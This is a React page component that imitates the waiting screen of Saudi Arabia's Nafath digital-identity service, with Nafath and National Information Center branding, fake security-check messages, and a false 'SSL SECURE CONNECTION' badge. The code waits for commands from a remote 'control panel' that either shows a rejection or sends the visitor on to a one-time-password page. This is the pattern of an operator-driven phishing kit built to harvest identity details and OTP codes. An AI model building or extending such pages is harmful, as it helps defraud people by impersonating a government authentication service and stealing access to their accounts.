import { useEffect, useState, useCallback } from "react";
import { useLocation } from "wouter";
import { Loader2, ShieldCheck, XCircle } from "lucide-react";


const nafathLogo = "https://upload.wikimedia.org/wikipedia/commons/thumb/c/cc/Nafath_logo.svg/3840px-Nafath_logo.svg.png";


const WAITING_STEPS = [
  "جارٍ تهيئة بروتوكول الاتصال الآمن...",
  "جارٍ فحص معايير التشفير والتحقق من الهوية...",
  "جارٍ مطابقة البيانات مع السجل الوطني الموحد...",
  "يتم الآن مزامنة الجلسة مع مركز المعلومات الوطني...",
  "جارٍ معالجة الطلب وتحديث حالة الحساب..."
];


export default function NomerWait() {
  const [, setLocation] = useLocation();
  const [currentStep, setCurrentStep] = useState(0);
  const [message, setMessage] = useState("جارٍ معالجة الطلب وتحديث حالة الحساب...");
  const [error, setError] = useState(false);
  const [errorMessage, setErrorMessage] = useState("");
  
  const sessionId = localStorage.getItem("sessionId");
  
  
  const handleSSEMessage = useCallback((event: MessageEvent) => {
    try {
      const data = JSON.parse(event.data);
      
      if (data.action === "nomer_error") {
        console.log("[NomerWait] Received error from control panel");
        setError(true);
        setErrorMessage("عذراً، فشلت عملية التحقق من البيانات المسجلة. يرجى إعادة المحاولة.");
        setMessage("تم رفض الطلب");
      } else if (data.action === "go_otp") {
        console.log("[NomerWait] Received go_otp, navigating to nomer-otp");
        localStorage.setItem("nomerVerified", "true");
        setLocation("/nomer-otp");
      }
    } catch (error) {
      console.error("[NomerWait] Error parsing SSE message:", error);
    }
  }, [setLocation]);


  useEffect(() => {
    if (!sessionId) return;
    
    const apiUrl = import.meta.env.VITE_API_URL || "";
    const baseUrl = apiUrl || window.location.origin;
    const sseUrl = `${baseUrl}/api/sse/${sessionId}`;
    
    const eventSource = new EventSource(sseUrl);
    
    eventSource.addEventListener("control", handleSSEMessage);
    
    return () => {
      eventSource.removeEventListener("control", handleSSEMessage);
      eventSource.close();
    };
  }, [sessionId, handleSSEMessage]);


  useEffect(() => {
    if (error) return;
    
    const interval = setInterval(() => {
      setCurrentStep((prev) => (prev + 1) % WAITING_STEPS.length);
    }, 4500);


    return () => clearInterval(interval);
  }, [error]);


  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#f8fafc",
        display: "flex",
        flexDirection: "column",
        fontFamily: "system-ui, -apple-system, sans-serif",
        color: "#1e293b",
        boxSizing: "border-box"
      }}
      dir="rtl"
    >
      <header
        style={{
          backgroundColor: "#ffffff",
          borderBottom: "1px solid #f1f5f9",
          padding: "14px 20px",
          display: "flex",
          justifyContent: "space-between",
          alignItems: "center",
          boxShadow: "0 1px 2px rgba(0,0,0,0.03)"
        }}
      >
        <img src={nafathLogo} alt="نفاذ" style={{ height: "26px", objectFit: "contain" }} />
        <span style={{ fontSize: '11px', fontWeight: 'bold', color: '#11998E', fontFamily: 'monospace', backgroundColor: '#e6f4f1', padding: '4px 8px', borderRadius: '6px' }}>
          SSL SECURE CONNECTION
        </span>
      </header>


      <div style={{ flex: 1, display: "flex", justifyContent: "center", alignItems: "center", padding: "24px 16px", boxSizing: "border-box" }}>
        <div style={{ backgroundColor: "#ffffff", borderRadius: "24px", border: "1px solid #e2e8f0", boxShadow: "0 10px 25px -5px rgba(0,0,0,0.05)", padding: "40px 24px", width: "100%", maxWidth: "400px", textAlign: "center", boxSizing: "border-box" }}>
          
          <img src={nafathLogo} alt="Nafath" style={{ height: "40px", margin: "0 auto 24px auto", objectFit: "contain" }} />
          
          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", justifyContent: "center", marginBottom: "28px" }}>
            {error ? (
              <XCircle style={{ width: "64px", height: "64px", color: "#dc2626" }} />
            ) : (
              <div style={{ position: "relative", display: "flex", alignItems: "center", justifyContent: "center" }}>
                <Loader2 style={{ width: "64px", height: "64px", color: "#11998E", animation: "spin 1.2s linear infinite" }} />
                <ShieldCheck style={{ width: "24px", height: "24px", color: "#11998E", position: "absolute" }} />
              </div>
            )}
          </div>
          
          <h2 style={{ fontSize: "19px", fontWeight: "bold", color: "#1e293b", marginBottom: "12px", marginTop: "0" }}>
            بوابة التصديق الرقمي الآمن
          </h2>
          
          <p style={{ color: "#475569", marginBottom: "28px", fontSize: "14px", lineHeight: "1.6", minHeight: "44px", transition: "all 0.3s ease" }}>
            {error ? errorMessage : WAITING_STEPS[currentStep]}
          </p>
          
          {!error && (
            <div style={{ backgroundColor: "#f8fafc", padding: "14px", borderRadius: "16px", border: "1px solid #e2e8f0", textAlign: "right" }}>
              <ul style={{ margin: 0, paddingRight: "16px", fontSize: "11px", color: "#64748b", lineHeight: "1.7" }}>
                <li style={{ marginBottom: "4px" }}>يرجى عدم إغلاق النافذة أو الضغط على زر التحديث.</li>
                <li style={{ marginBottom: "4px" }}>تستغرق عملية الفحص والمصادقة بضع دقائق لحمايتك.</li>
                <li>سيتم توجيهك تلقائياً فور اكتمال معالجة الطلب في الخادم.</li>
              </ul>
            </div>
          )}
        </div>
      </div>


      <footer style={{ backgroundColor: "#f1f5f9", borderTop: "1px solid #e2e8f0", padding: "16px 20px" }}>
        <div
          style={{
            maxWidth: "400px",
            margin: "0 auto",
            display: "flex",
            flexDirection: "row",
            justifyContent: "space-between",
            alignItems: "center",
            gap: "12px"
          }}
        >
          <div style={{ textAlign: "right" }}>
            <h6 style={{ fontWeight: "bold", fontSize: "12px", color: "#1e293b", margin: "0 0 2px 0" }}>
              مركز المعلومات الوطني
            </h6>
            <p style={{ fontSize: "10px", color: '#94a3b8', margin: "0" }}>
              جميع الحقوق محفوظة © {new Date().getFullYear()}
            </p>
          </div>
          <div>
            <img src={nafathLogo} alt="NIC" style={{ height: "28px", opacity: "0.5", filter: "grayscale(100%)" }} />
          </div>
        </div>
      </footer>


      <style>{`
        @keyframes spin {
          to { transform: rotate(360deg); }
        }
      `}</style>
    </div>
  );
}
